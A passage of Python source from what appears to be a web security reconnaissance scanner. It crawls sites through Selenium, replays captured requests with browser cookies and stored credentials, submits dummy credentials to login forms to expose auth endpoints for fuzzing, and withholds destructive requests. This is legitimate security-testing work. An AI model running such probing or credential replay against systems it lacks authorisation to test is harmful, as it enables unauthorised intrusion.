        for r in recs or []:
            try:
                raw_url = r.get('url') or ''
                method = (r.get('method') or 'GET').upper()
            except Exception:
                continue
            pu = urlparse(urljoin(cur, raw_url))
            if pu.scheme not in ('http', 'https') or not self._host_in_scope(pu.netloc):
                continue
            self._note_subdomain(pu.netloc)
            self._note_embedded_hosts(pu.geturl())
            if (pu.path or '').lower().endswith(('.js', '.mjs', '.css', '.map',
                                                 '.png', '.jpg', '.svg', '.woff',
                                                 '.woff2', '.ico')):
                continue
            url = pu._replace(fragment='').geturl()
            params = self._parse_body_params(r.get('body', ''), r.get('ct', ''))
            key = (method, url.split('?', 1)[0], tuple(sorted(params)))
            if key in seen:
                continue
            seen.add(key)
            out.append({'method': method, 'url': url, 'params': params,
                        'body': r.get('body', ''), 'ct': r.get('ct', ''),
                        'status': r.get('status'), 'resp_body': r.get('respBody', ''),
                        'req_headers': r.get('reqHeaders') or {},
                        'resp_headers': r.get('respHeaders') or {}})
        return out

    # HTTP methods that are safe to replay automatically to capture a response.
    # Anything else (POST/PUT/PATCH/DELETE) is recorded as a request only, so we
    # never trigger a side effect the user didn't ask for — it can be fired from
    # the Repeater.
    _SAFE_REPLAY = ('GET', 'HEAD', 'OPTIONS')

    def _browser_ua(self) -> str:
        """The live browser's User-Agent, cached. Forbidden header the JS hook
        can't read, so it's rebuilt onto observed/replayed requests."""
        if not self._ua:
            try:
                self._ua = self.driver.execute_script('return navigator.userAgent')
            except Exception:
                self._ua = 'Mozilla/5.0'
        return self._ua

    def _cookie_header(self, url) -> str:
        """Rebuild the Cookie header the browser sent for `url` from the live
        jar. The fetch/XHR instrumentation can't see Cookie (a forbidden header
        the browser sets itself), and get_cookies() includes HttpOnly cookies
        (read over CDP), so this is how observed requests stay reproducible in
        the Repeater. Scoped by cookie domain + path, as the browser does."""
        try:
            jar = self.driver.get_cookies()
        except Exception:
            return ''
        pu = urlparse(url)
        host = (pu.hostname or '').lower()
        path = pu.path or '/'
        pairs = []
        for c in jar:
            dom = (c.get('domain') or '').lstrip('.').lower()
            if dom and not (host == dom or host.endswith('.' + dom)):
                continue
            cpath = c.get('path') or '/'
            if not path.startswith(cpath):
                continue
            name = c.get('name')
            if name:
                pairs.append(f"{name}={c.get('value', '')}")
        return '; '.join(pairs)

    def _auth_for(self, url):
        """The credential descriptor stored for this URL's host, or None.
        Keyed by bare host so it survives port/scheme differences."""
        if not self.auth_scan:
            return None
        return self.host_auth.get(_host_only(urlparse(url).netloc))

    @staticmethod
    def _auth_mutations(cred):
        """Translate a credential descriptor into request mutations. Returns
        (headers_dict, cookie_str). 'form' / 'none' / None yield nothing here —
        form login is performed in the browser, not by header injection."""
        headers, cookie = {}, ''
        if not cred:
            return headers, cookie
        t = cred.get('type')
        if t == 'basic':
            import base64
            raw = f"{cred.get('username', '')}:{cred.get('password', '')}"
            headers['Authorization'] = 'Basic ' + base64.b64encode(
                raw.encode('utf-8', 'ignore')).decode('ascii')
        elif t == 'bearer':
            tok = cred.get('token', '').strip()
            if tok:
                headers['Authorization'] = ('Bearer ' + tok
                    if not tok.lower().startswith('bearer ') else tok)
        elif t == 'apikey':
            name = (cred.get('header') or 'X-API-Key').strip() or 'X-API-Key'
            headers[name] = cred.get('key', '')
        elif t == 'header':
            if cred.get('name', '').strip():
                headers[cred['name'].strip()] = cred.get('value', '')
        elif t == 'cookie':
            cookie = cred.get('cookie', '').strip()
        return headers, cookie

    @staticmethod
    def _is_auth_wall(node) -> bool:
        """A response that a credential could plausibly unlock: 401 always, or a
        403 that advertises an auth scheme (WWW-Authenticate). A bare 403 is left
        out — it's usually WAF/geo blocking, which no credential here fixes."""
        st = node.resp_status or node.status_code or 0
        if st == 401:
            return True
        if st == 403:
            return any(k.lower() == 'www-authenticate'
                       for k in (node.resp_headers or {}))
        return False

    def _maybe_prompt_auth(self, node, url, force=False) -> bool:
        """Authenticated scan: if `node`'s response is an auth wall (or force=True
        for a login form) for a host not yet configured, pause this scan thread
        and prompt the user once for that host. Stores the credential in
        host_auth and returns True if the caller should re-capture the request.
        One prompt per host (tracked in auth_asked), reused for every later
        request to that host."""
        if not (self.auth_scan and self.auth_callback and self.running):
            return False
        host = _host_only(urlparse(url).netloc)
        if not host or host in self.auth_asked or host in self.host_auth:
            return False
        if not (force or self._is_auth_wall(node)):
            return False
        self.auth_asked.add(host)
        self._log(f'Auth wall on {host} (HTTP '
                  f'{node.resp_status or node.status_code}) — prompting for '
                  f'credentials …')
        try:
            cred = self.auth_callback(node)
        except Exception as e:
            self._log(f'Auth prompt error: {e}')
            return False
        if not cred or cred.get('type') in (None, 'none'):
            self._log(f'No credential set for {host} — continuing unauthenticated.')
            return False
        self.host_auth[host] = cred
        if cred.get('type') == 'form':
            # Form login is performed in the browser, not by header injection.
            self.username = cred.get('username', '')
            self.password = cred.get('password', '')
            self.logged_in = False
            self._login_tries = 0
            try:
                self._try_login()
            except Exception:
                pass
        self._apply_browser_auth(host)
        self._log(f'Credential set for {host} ({cred.get("type")}).')
        return True

    def _apply_browser_auth(self, host):
        """Apply a host's credential to the live browser so top-level navigations
        (not just the requests-path) are authenticated. Only acts for THIS scan's
        own host — sibling hosts are authenticated by their own sub-scan, whose
        driver is actually on that host. Cookie → live jar; bearer/apikey/header
        → CDP header injection (Chrome only).

        Note: CDP setExtraHTTPHeaders applies to every request the page makes,
        so a header can also reach third-party subresources embedded in this
        host's pages (analytics/CDN). It never crosses to a *different* host,
        because each scan instance crawls exactly one host."""
        if host != self._entry_host or not self.driver:
            return
        cred = self.host_auth.get(host)
        if not cred:
            return
        t = cred.get('type')
        if t == 'cookie':
            for part in cred.get('cookie', '').split(';'):
                if '=' in part:
                    name, _, val = part.strip().partition('=')
                    try:
                        self.driver.add_cookie({'name': name, 'value': val})
                    except Exception:
                        pass
        elif t in ('bearer', 'apikey', 'header'):
            headers, _ = self._auth_mutations(cred)
            if self.is_chrome and headers:
                try:
                    self.driver.execute_cdp_cmd('Network.setExtraHTTPHeaders',
                                                {'headers': headers})
                    self._log(f'CDP: injecting auth header(s) into browser '
                              f'navigation for {host}.')
                except Exception as e:
                    self._log(f'CDP header injection failed: {e}')
            elif headers:
                self._log('Browser-navigation header injection needs Chrome '
                          '(CDP) — install Chrome for it; the requests/probe '
                          'path is authenticated regardless.')
        # 'form' is already applied via the browser login in _maybe_prompt_auth.

    def _replay(self, node: SiteNode, method, url, body='', ct='', extra_headers=None):
        """Replay a request with the browser's cookies/UA and record the raw
        request + response onto the node. Fragments are dropped (never sent).
        extra_headers carries app-set headers observed on the original request
        (e.g. Authorization) so the re-send reproduces it faithfully."""
        if not REQUESTS_AVAILABLE:
            return
        method = (method or 'GET').upper()
        # Never auto-send a state-changing (non-GET) request that is either
        # destructive (delete/exec/credential op / DELETE method) or outside the
        # safe-path whitelist. GET/HEAD reads are always permitted. The withheld
        # request is still surfaced on the node (request + response panes) so the
        # path is visible in the inspector and can be fired from the Repeater.
        if method not in ('GET', 'HEAD') and not self.unsafe:
            # An exact (non-glob) whitelist entry overrides the destructive veto.
            explicit = (self.whitelist is not None
                        and self.whitelist.is_explicit(url))
            destructive = self._is_destructive_send(url, method) and not explicit
            blocked = destructive or not self._interaction_allowed(url)
            if blocked:
                pu = urlparse(url)
                path = (pu.path or '/') + (('?' + pu.query) if pu.query else '')
                node.probe_state = 'unsent'
                node.req_method  = method
                node.req_url     = url
                node.req_body    = body or node.req_body or ''
                if ct:
                    node.content_type = ct
                if extra_headers and not node.req_headers:
                    node.req_headers = dict(extra_headers)
                node.status_code = None
                node.resp_status = None
                reason = (f'{method} {path} names a state-changing / destructive '
                          'action' if destructive else
                          f'{method} {path} is outside the safe-path whitelist '
                          '(whitelist is ON)')
                node.resp_body = (
                    f'Withheld — {reason}.\nThe request is shown here for review; '
                    'nothing was sent. Edit and send it from the Repeater to test '
                    'it' + ('' if destructive else
                            ', or add the path in Settings ▸ Performance') + '.')
                self._log(f'  {method} withheld '
                          f'({"destructive" if destructive else "not in whitelist"})'
                          f': {url[:64]}')
                return
        target = urlparse(url)._replace(fragment='').geturl()
        sess = requests.Session()
        if self.username or self.password:
            sess.auth = (self.username, self.password)
        try:
            for c in self.driver.get_cookies():
                sess.cookies.set(c.get('name'), c.get('value'),
                                 domain=c.get('domain'), path=c.get('path', '/'))
        except Exception:
            pass
        headers = {'User-Agent': self._browser_ua(),
                   'Accept': 'text/html,application/xhtml+xml,*/*'}
        if ct:
            headers['Content-Type'] = ct
        # Overlay the observed app headers; skip ones requests/urllib must own or
        # the session already provides (Cookie comes from the jar above).
        for k, v in (extra_headers or {}).items():
            if k.lower() not in ('host', 'content-length', 'connection',
                                  'accept-encoding', 'cookie'):
                headers[k] = v
        # Authenticated scan: overlay the host's stored credential (wins over the
        # observed headers). Covers probes, mined endpoints and page captures —
        # everything that flows through _replay.
        ah, acookie = self._auth_mutations(self._auth_for(url))
        for k, v in ah.items():
            headers[k] = v
        if acookie:
            existing = next((h for h in headers if h.lower() == 'cookie'), None)
            headers[existing or 'Cookie'] = (
                f"{headers[existing]}; {acookie}" if existing else acookie)
        data = body if (body and method not in ('GET', 'HEAD')) else None
        try:
            r = sess.request(method, target, headers=headers, data=data,
                             timeout=20, verify=False, allow_redirects=False)
        except Exception as e:
            # The request never produced a response (DNS/connect/timeout/TLS).
            # Mark it as a transport error rather than leaving a bare None status
            # that looks identical to an unsent or never-probed node.
            self._log(f'http capture error: {e}')
            node.probe_state = 'error'
            node.error_reason = f'{type(e).__name__}: {e}'
            node.req_method = node.req_method or method
            node.req_url = node.req_url or target
            return
        node.probe_state = 'ok'
        node.error_reason = ''
        node.req_method  = r.request.method
        node.req_url     = r.request.url
        node.req_headers = dict(r.request.headers)
        if r.request.body:
            node.req_body = (r.request.body if isinstance(r.request.body, str)
                             else '[binary]')
        node.resp_status = r.status_code
        node.resp_reason = r.reason
        node.resp_headers = dict(r.headers)
        node.resp_body   = r.text[:12000]
        node.status_code = r.status_code
        node.content_type = r.headers.get('Content-Type', '')
        node.headers = dict(r.headers)

    def _capture_http(self, node: SiteNode, url):
        """Capture the GET request/response that produced a page/script node."""
        self._replay(node, 'GET', url)

    def _capture_observed(self, node: SiteNode, rec: dict):
        """Populate a node from a request observed in live traffic: set its
        method, URL, query params (data in: GET) and body params (data in:
        POST/PUT/…). Use the response captured live when we have it; otherwise
        replay safe methods only — never auto-replay a POST/PUT/… so we don't
        trigger a side effect (e.g. re-logging-in and invalidating the session)."""
        method = (rec.get('method') or 'GET').upper()
        url = rec['url']
        pu = urlparse(url)
        if pu.query:
            node.get_params = parse_qs(pu.query, keep_blank_values=True)
        body_params = rec.get('params') or {}
        if method in ('GET', 'HEAD'):
            for k, v in body_params.items():
                node.get_params.setdefault(k, v if isinstance(v, list) else [v])
        else:
            node.post_params = {k: (v if isinstance(v, list) else [v])
                                for k, v in body_params.items()}
        node.req_method = method
        node.req_url = url
        node.req_body = rec.get('body', '') or ''
        node.req_headers = dict(rec.get('req_headers') or {})
        live_status = rec.get('status')
        if live_status is not None:
            # Response the browser actually received — no re-send needed.
            node.probe_state = 'ok'
            node.status_code = live_status
            node.resp_status = live_status
            node.resp_reason = ''
            node.resp_body = rec.get('resp_body', '') or ''
            node.resp_headers = dict(rec.get('resp_headers') or {})
            # Content type from the *response* (rec['ct'] is the request's CT,
            # usually empty for GET); fall back to it when the header is absent.
            node.content_type = next(
                (v for k, v in node.resp_headers.items()
                 if k.lower() == 'content-type'), '') or (rec.get('ct', '') or '')
        elif method in ('GET', 'HEAD') and self._is_unsafe_get(url):
            # GET/HEAD whose path names a session-kill / job-trigger op: surface
            # it but don't auto-send (some apps execute these on GET). OPTIONS is
            # non-executing, so it stays in the replay branch below.
            self._seed_unsafe_get(node)
            node.content_type = (rec.get('ct', '') or '')
        elif method in self._SAFE_REPLAY:
            self._replay(node, method, url, ct=rec.get('ct', ''),
                         extra_headers=rec.get('req_headers'))
        else:
            node.probe_state = 'unsent'
            node.status_code = None
            node.content_type = (rec.get('ct', '') or '')
            node.resp_status = None
            src = ('observed in live traffic' if rec.get('observed')
                   else 'discovered from a spec/source — body seeded as a template')
            node.resp_body = (f'({method} endpoint {src}; not auto-sent to avoid '
                              f'side effects. Edit the body and send it from the '
                              f'Repeater to test it.)')
        # Cookie/User-Agent are forbidden headers the browser hides from
        # fetch/XHR, so the observed request headers lack them; rebuild from the
        # live session so the stored request reproduces in the Repeater. (The
        # safe-replay branch already gets them from _replay's requests session.)
        if not any(k.lower() == 'cookie' for k in node.req_headers):
            ck = self._cookie_header(url)
            if ck:
                node.req_headers['Cookie'] = ck
        if not any(k.lower() == 'user-agent' for k in node.req_headers):
            node.req_headers['User-Agent'] = self._browser_ua()

    def _extract(self, url, parent_url) -> SiteNode:
        """Capture page metadata, text and forms from the live rendered DOM."""
        node = SiteNode(url, parent_url=parent_url)
        try:
            node.title = self.driver.title
            html = self.driver.page_source
            node.raw_html = html

            parsed = urlparse(url)
            if parsed.query:
                node.get_params = parse_qs(parsed.query, keep_blank_values=True)
            if parsed.fragment.startswith(('/', '!')):
                node.node_type = 'page'
            else:
                last = (parsed.path or '/').rstrip('/').rsplit('/', 1)[-1].lower()
                ext = '.' + last.rsplit('.', 1)[-1] if '.' in last else ''
                if not ext or ext in PAGE_EXT:
                    node.node_type = 'page'
                else:
                    node.node_type = 'file'
            # Endpoint that performs a redirect (open-redirect-style handlers).
            if 'redirect' in (parsed.path or '').lower():
                node.node_type = 'redirect'

            if BS4_AVAILABLE:
                soup = BeautifulSoup(html, 'html.parser')
                node.text_content = soup.get_text(separator='\n', strip=True)[:self._TEXT_SNIPPET]
                forms = []
                for form in soup.find_all('form'):
                    forms.append({
                        'action': urljoin(url, form.get('action', '')),
                        'method': form.get('method', 'get').upper(),
                        'inputs': [
                            {'name': i.get('name', ''), 'type': i.get('type', 'text')}
                            for i in form.find_all(['input', 'textarea', 'select'])
                            if i.get('name')
                        ],
                    })
                node.forms = forms
            else:
                node.text_content = re.sub(r'<[^>]+>', ' ', html)[:self._TEXT_SNIPPET]
        except Exception as e:
            self._log(f'Extract error on {url}: {e}')
        return node

    def _collect_links(self, base_url, domain) -> set:
        """Read every <a href> from the live DOM, keeping SPA hash routes."""
        links = set()
        try:
            for a in self.driver.find_elements(By.TAG_NAME, 'a'):
                try:
                    href = a.get_attribute('href')
                except Exception:
                    continue
                if not href:
                    continue
                href = href.strip()
                if href.lower().startswith(('mailto:', 'tel:', 'javascript:')):
                    continue
                full = urljoin(base_url, href)
                pu = urlparse(full)
                if pu.scheme not in ('http', 'https'):
                    continue
                self._note_embedded_hosts(full)
                if pu.netloc != domain:
                    # A link to another in-scope host — report it so the app can
                    # spin up its own graph/scan; not crawled by this pass. Keep
                    # the full URL as a seed for that host's sub-scan: it's a real
                    # navigation target (what a user would click), so the sub-scan
                    # can start there even if the host's bare '/' is a dead end.
                    sub_host = _host_only(pu.netloc)
                    if (sub_host and sub_host != self._entry_host
                            and self._host_in_scope(sub_host)):
                        seeds = self.sub_seeds.setdefault(sub_host, set())
                        if len(seeds) < 40:
                            seeds.add(pu._replace(fragment='').geturl())
                    self._note_subdomain(pu.netloc)
                    continue
                # drop in-page anchors (#section) but keep SPA routes (#/route)
                if pu.fragment and not pu.fragment.startswith(('/', '!')):
                    full = pu._replace(fragment='').geturl()
                if not self._in_scope(full):
                    continue
                # A link to a destructive action (Logout / Delete / …) is
                # recorded but never navigated to — a careful user wouldn't click
                # it, and the navigation would be a real GET with a side effect.
                # In unsafe (intercept) mode we follow it anyway: the user vets
                # each request in the interceptor.
                if not self.unsafe and self._is_destructive_link(full):
                    self._record_unsafe_link(full, base_url)
                    continue
                links.add(full)
        except Exception as e:
            self._log(f'link scan error: {e}')
        return links

    def _record_unsafe_link(self, url, parent_url):
        """Record a destructive <a href> (Logout / Delete / …) as a discovered
        node without navigating to it, so it's surfaced for manual testing while
        its side-effecting GET is never auto-fired. Deduped against seen URLs and
        bounded by the asset cap."""
        norm = self._norm(url)
        if (norm in self.visited or norm in self.assets
                or len(self.assets) >= self.max_assets):
            return
        self.assets.add(norm)
        node = SiteNode(url, node_type='page', parent_url=parent_url)
        pu = urlparse(url)
        if pu.query:
            node.get_params = parse_qs(pu.query, keep_blank_values=True)
        self._seed_unsafe_get(node)
        node.scanned = True
        self._log(f'  Link seeded (destructive, not visited): {url[:64]}')
        if self.on_node:
            self.on_node(node)

    def _interaction_allowed(self, url) -> bool:
        """Whether a state-changing interaction with `url` is permitted by the
        safe-path whitelist (control clicks, form submits, non-GET requests).
        Always True when no whitelist is configured. Passive GET navigation is
        never gated by this."""
        wl = self.whitelist
        if wl is None or not getattr(wl, 'enabled', False):
            return True
        return wl.allows(url)

    def _collect_clickable_routes(self, domain) -> set:
        """User-like discovery: click SPA nav items that have no <a href> and
        record any route change. Destructive-looking controls are skipped (by
        label). Navigation is exploration, so it isn't whitelist-gated — the
        whitelist governs auto-sent non-GET requests, not link/route clicking."""
        routes = set()
        if self.max_clicks <= 0:
            return routes
        selectors = [
            '.el-menu-item', '.el-sub-menu__title', '.el-submenu__title',
            '[role="menuitem"]', '.menu-item', '.nav-item',
            '.sidebar li', 'aside li', 'nav li',
        ]
        # Gather unique visible labels of nav candidates
        labels, seen = [], set()
        for sel in selectors:
            try:
                els = self.driver.find_elements(By.CSS_SELECTOR, sel)
            except Exception:
                continue
            for el in els:
                try:
                    if not el.is_displayed():
                        continue
                    txt = (el.text or '').strip().split('\n')[0]
                except Exception:
                    continue
                if not txt or txt in seen:
                    continue
                if not self.unsafe and any(d in txt.lower() for d in DESTRUCTIVE):
                    continue
                seen.add(txt)
                labels.append((sel, txt))
                if len(labels) >= self.max_clicks:
                    break
            if len(labels) >= self.max_clicks:
                break

        for sel, txt in labels:
            if not self.running:
                break
            try:
                target_el = None
                for el in self.driver.find_elements(By.CSS_SELECTOR, sel):
                    try:
                        if el.is_displayed() and (el.text or '').strip().split('\n')[0] == txt:
                            target_el = el
                            break
                    except Exception:
                        continue
                if target_el is None:
                    continue
                before = self.driver.current_url
                self.driver.execute_script('arguments[0].click();', target_el)
                self._wait_ready(max_wait=6)
                after = self.driver.current_url
                if after != before and urlparse(after).netloc == domain:
                    routes.add(after)
                    self._log(f'  clicked "{txt[:24]}" -> {after[:55]}')
            except Exception:
                continue
        return routes

    # Non-destructive interactive controls a real user would click to exercise
    # the page (and make it fire its read-style API calls, revealing params like
    # orderBy / page / search filters).
    _INTERACT_SELECTORS = (
        'button', '[role="button"]', '[role="tab"]', '.el-tabs__item',
        '.nav-tabs a', 'th[role="columnheader"]', 'thead th', '.sortable',
        '.el-table__header-wrapper th', '.caret-wrapper', '.sort-caret',
        '.pagination li', '.el-pagination button', '.el-pager li',
    )
    # Inputs to fill with a probe value: only search-like fields (avoids
    # submitting create/edit forms).
    _SEARCH_HINTS = ('search', 'query', 'keyword', 'filter', 'find', 'q',
                     'busca', 'buscar', 'recherche', 'suche', '搜索', '查询')
    # Labels/classes that mark a button as a search/filter trigger (so a
    # button-driven search fires even when Enter doesn't). Non-destructive only.
    _SEARCH_BTN_HINTS = ('search', 'filter', 'query', 'find', 'go',
                         'busca', 'buscar', 'filtrar', 'recherche', 'suchen',
                         '搜索', '查询', '筛选', '検索')
    _SEARCH_PROBE = 'recon'

    def _click_search_trigger(self, input_el) -> bool:
        """Click a search/filter/query button near `input_el` (same form or
        toolbar/header container) so button-driven searches fire and their
        request — and POST body — is captured. Hint-gated and skips anything
        that looks state-changing (MUTATING), so nothing destructive is clicked."""
        try:
            scope = input_el.find_element(
                By.XPATH,
                './ancestor::form[1] | ./ancestor::*[contains(@class,"search") '
                'or contains(@class,"filter") or contains(@class,"toolbar") '
                'or contains(@class,"header") or contains(@class,"operation")][1]')
        except Exception:
            scope = None
        try:
            btns = (scope or self.driver).find_elements(
                By.CSS_SELECTOR,
                'button, [role="button"], .el-button, input[type="submit"], '
                '[class*="search"], [class*="filter"]')
        except Exception:
            btns = []
        for b in btns:
            try:
                if not b.is_displayed():
                    continue
                blob = ' '.join(filter(None, [
                    (b.text or '').strip().lower(),
                    (b.get_attribute('aria-label') or '').lower(),
                    (b.get_attribute('title') or '').lower(),
                    (b.get_attribute('class') or '').lower()]))
                if not self.unsafe and any(m in blob for m in MUTATING):
                    continue
                if any(h in blob for h in self._SEARCH_BTN_HINTS):
                    self.driver.execute_script('arguments[0].click();', b)
                    return True
            except Exception:
                continue
        return False

    # Benign throwaway values submitted into auth forms purely to make the page
    # fire its real login request, so the endpoint (URL + method + body) can be
    # captured. They are expected to FAIL auth — never real credentials.
    _PROBE_EMAIL = 'recon@example.com'
    _PROBE_USER  = 'recon'
    _PROBE_PASS  = 'ReconProbe!123'
    # Markers that say a password-bearing form is a registration, not a login —
    # skip those so the probe never creates an account / mutates server state.
    _SIGNUP_MARKERS = ('register', 'registration', 'signup', 'sign-up', 'sign up',
                       'create account', 'create-account', 'join', 'cadastr')

    def _probe_login_forms(self, domain) -> set:
        """Fill auth/login forms with throwaway values and submit them so the
        page fires its real authentication request (commonly a JS fetch/XHR with
        a JSON or form body). That request is captured by the fetch/XHR
        instrumentation and becomes a fuzzable endpoint — the only way to surface
        a login POST whose URL, method and body live entirely in page JavaScript.

        Scoped to genuine login gates — exactly one visible password field and no
        sign-up markers — so it doesn't create server state. One submit per
        distinct form per scan; benign values mean it is just a failed login.
        Skipped in Stealth mode (active, makes a request)."""
        routes: set = set()
        if self.mode == 'Stealth' or not self.running:
            return routes
        try:
            forms = self.driver.find_elements(By.TAG_NAME, 'form')
        except Exception:
            forms = []
        for form in forms:
            if not self.running:
                break
            try:
                pwds = [e for e in form.find_elements(
                    By.CSS_SELECTOR, 'input[type="password"]') if e.is_displayed()]
                if len(pwds) != 1:      # 0 → not auth; 2+ → registration / change-pw
                    continue
                blob = ' '.join(filter(None, [
                    form.get_attribute('id'), form.get_attribute('class'),
                    form.get_attribute('action'), form.get_attribute('name'),
                    form.text])).lower()
                if any(w in blob for w in self._SIGNUP_MARKERS):
                    continue
                sig = (form.get_attribute('action') or '') + '|' + \
                    urlparse(self.driver.current_url).path
                if sig in self._probed_forms:
                    continue
                self._probed_forms.add(sig)
                before = self.driver.current_url
                if not self._fill_and_submit(form, pwds[0]):
                    continue
                self._log('  login form: submitted probe credentials to capture '
                          'the auth request')
                self._wait_ready(max_wait=6)
                after = self.driver.current_url
                if after != before and urlparse(after).netloc == domain:
                    routes.add(after)
            except Exception:
                continue
        return routes

    def _fill_and_submit(self, form, pwd_el) -> bool:
        """Fill a form's visible text-like inputs with benign probe values and
        submit it. Returns True if a submit was actually triggered."""
        try:
            fields = form.find_elements(By.CSS_SELECTOR, 'input, textarea')
        except Exception:
            fields = []
        filled = False
        for el in fields:
            try:
                if not (el.is_displayed() and el.is_enabled()):
                    continue
                t = (el.get_attribute('type') or 'text').lower()
                if t in ('hidden', 'submit', 'button', 'reset', 'file', 'image',
                         'checkbox', 'radio', 'range', 'color'):
                    continue
                if t == 'password':
                    val = self._PROBE_PASS
                elif t == 'email':
                    val = self._PROBE_EMAIL
                else:
                    attrs = ' '.join(filter(None, [
                        el.get_attribute('name'), el.get_attribute('id'),
                        el.get_attribute('autocomplete'),
                        el.get_attribute('placeholder')])).lower()
                    val = self._PROBE_EMAIL if 'email' in attrs else self._PROBE_USER
                el.clear()
                el.send_keys(val)
                filled = True
            except Exception:
                continue
        if not filled:
            return False
        # Trigger submission so JS submit handlers (fetch-based logins) fire:
        # click the submit control, else requestSubmit()/submit(), else Enter.
        try:
            btns = form.find_elements(
                By.CSS_SELECTOR,
                'button[type="submit"], input[type="submit"], button')
            btn = next((b for b in btns
                        if b.is_displayed() and b.is_enabled()), None)
            if btn is not None:
                self.driver.execute_script('arguments[0].click();', btn)
                return True
        except Exception:
            pass
        try:
            self.driver.execute_script(
                'if(arguments[0].requestSubmit){arguments[0].requestSubmit();}'
                'else{arguments[0].submit();}', form)
            return True
        except Exception:
            pass
        try:
            pwd_el.send_keys(Keys.RETURN)
            return True
        except Exception:
            return False

    def _interact(self, domain) -> set:
        """Drive the page like a user — type a probe into search boxes and click
        non-destructive controls (buttons, tabs, sortable headers, pagination) —
        so the app fires the XHR/fetch calls (and reveals the params) it only
        issues on interaction. Route changes are returned as new pages; the
        triggered requests are captured by the network instrumentation. Bounded
        by max_clicks; skips anything whose label looks state-changing."""
        routes = set()
        budget = self.max_clicks
        if budget <= 0:
            return routes

        # 0) Submit auth/login forms with throwaway values so the page fires its
        #    real login request — often a JS fetch/XHR whose URL, method and body
        #    exist only in the page's JavaScript and are invisible until submit.
        #    That request is captured by the instrumentation and becomes a
        #    fuzzable endpoint (e.g. POST /login {email,password}).
        try:
            routes |= self._probe_login_forms(domain)
        except Exception:
            pass

        # 1) Fill + submit visible search-like inputs.
        try:
            inputs = self.driver.find_elements(
                By.CSS_SELECTOR,
                'input[type="search"], input[type="text"], input:not([type])')
        except Exception:
            inputs = []
        for el in inputs:
            if budget <= 0 or not self.running:
                break
            try:
                if not (el.is_displayed() and el.is_enabled()):
                    continue
                attrs = ' '.join(filter(None, [
                    el.get_attribute('name'), el.get_attribute('id'),
                    el.get_attribute('placeholder'), el.get_attribute('type'),
                    el.get_attribute('aria-label')])).lower()
                is_search = (el.get_attribute('type') == 'search'
                             or any(h in attrs for h in self._SEARCH_HINTS))
                if not is_search or 'password' in attrs:
                    continue
                before = self.driver.current_url
                el.clear()
                el.send_keys(self._SEARCH_PROBE)
                el.send_keys(Keys.RETURN)
                # Enter alone often doesn't fire Element-Plus / button-driven
                # searches — also click a nearby search/filter button so the
                # query request goes out and its POST body is captured.
                self._click_search_trigger(el)
                budget -= 1
                self._wait_ready(max_wait=5)
                after = self.driver.current_url
                if after != before and urlparse(after).netloc == domain:
                    routes.add(after)
            except Exception:
                continue

        # 2) Click non-destructive controls (re-querying each time, since clicks
        #    mutate the DOM). Skip labels that look like state changes.
        seen = set()
        for sel in self._INTERACT_SELECTORS:
            if budget <= 0 or not self.running:
                break
            try:
                count = len(self.driver.find_elements(By.CSS_SELECTOR, sel))
            except Exception:
                count = 0
            for i in range(count):
                if budget <= 0 or not self.running:
                    break
                try:
                    els = self.driver.find_elements(By.CSS_SELECTOR, sel)
                    if i >= len(els):
                        break
                    el = els[i]
                    if not el.is_displayed():
                        continue
                    txt = (el.text or el.get_attribute('aria-label') or '').strip().lower()
                    # Match MUTATING against text AND title/class/descendant-icon
                    # class, so an icon-only control (e.g. a trash-icon delete
                    # button with no text or aria-label) is still filtered out —
                    # text alone misses it and would let it be clicked.
                    blob = ' '.join(filter(None, [
                        txt,
                        (el.get_attribute('title') or '').lower(),
                        (el.get_attribute('class') or '').lower()]))
                    try:
                        for ic in el.find_elements(
                                By.CSS_SELECTOR, 'i, svg, use, [class*="icon"]'):
                            blob += ' ' + ' '.join(filter(None, [
                                (ic.get_attribute('class') or '').lower(),
                                (ic.get_attribute('href') or '').lower(),
                                (ic.get_attribute('xlink:href') or '').lower()]))
                    except Exception:
                        pass
                    key = (sel, txt, i)
                    if not self.unsafe and any(m in blob for m in MUTATING):
                        continue
                    if key in seen:
                        continue
                    seen.add(key)
                    before = self.driver.current_url
                    self.driver.execute_script('arguments[0].click();', el)
                    budget -= 1
                    self._wait_ready(max_wait=4)
                    after = self.driver.current_url
                    if after != before and urlparse(after).netloc == domain:
                        routes.add(after)
                        # Navigated away — stop clicking stale elements; the new
                        # page will be crawled (and interacted with) on its own.
                        return routes
                except Exception:
                    continue
        return routes

    # ── API endpoint & JS bundle discovery ──────────────────
    def _collect_scripts(self, base_url, domain) -> set:
        """Same-domain scripts the page uses — static <script src> tags AND
        any scripts the browser loaded at runtime (lazy chunks, dynamic
        import(), injected analytics, …) read from the Performance API."""
        out = set()
        try:
            for s in self.driver.find_elements(By.TAG_NAME, 'script'):
                try:
                    src = s.get_attribute('src')
                except Exception:
                    continue
                if not src:
                    continue
                pu = urlparse(urljoin(base_url, src.strip()))
                if pu.scheme in ('http', 'https') and self._same_site(pu.netloc):
                    out.add(pu._replace(fragment='').geturl())
        except Exception as e:
            self._log(f'script scan error: {e}')
        # Dynamically-loaded scripts via Performance API. Include anything the
        # browser called a 'script', plus 'fetch'/XHR resources whose path ends
        # in .js/.mjs (ES-module dynamic / static imports register as 'fetch'
        # in many browser versions — e.g. shared "chunk-*.js" modules).
        try:
            items = self.driver.execute_script(
                "return (window.performance.getEntriesByType('resource')||[])"
                ".map(function(e){return [e.name, e.initiatorType];});")
        except Exception:
            items = []
        for item in items or []:
            try:
                name, itype = item[0], item[1]
            except Exception:
                continue
            pu = urlparse(name)
            if pu.scheme not in ('http', 'https') or not self._same_site(pu.netloc):
                continue
            path_low = (pu.path or '').lower()
            is_js_url = path_low.endswith(('.js', '.mjs'))
            if itype == 'script' or (itype in ('fetch', 'xmlhttprequest') and is_js_url):
                out.add(pu._replace(fragment='').geturl())
        return out

    def _collect_api_perf(self, domain) -> set:
        """XHR/fetch calls the page already made, read from the Performance API."""
        out = set()
        try:
            entries = self.driver.execute_script(
                "return (window.performance.getEntriesByType('resource')||[])"
                ".map(function(e){return [e.name, e.initiatorType];});")
        except Exception:
            entries = []
        for item in entries or []:
            try:
                name, itype = item[0], item[1]
            except Exception:
                continue
            if itype in ('xmlhttprequest', 'fetch', 'beacon'):
                pu = urlparse(name)
                if pu.scheme not in ('http', 'https') or not self._same_site(pu.netloc):
                    continue
                # JS module imports register as 'fetch'/xhr but are scripts, not
                # APIs — let _collect_scripts pick them up instead.
                if (pu.path or '').lower().endswith(('.js', '.mjs')):
                    continue
                out.add(pu._replace(fragment='').geturl())
        return out

    # A path segment that looks dynamic — a numeric id or a UUID — which marks a
    # REST-style resource endpoint (/users/123, /orders/<uuid>) even when the
    # path carries none of the API_HINTS keywords.
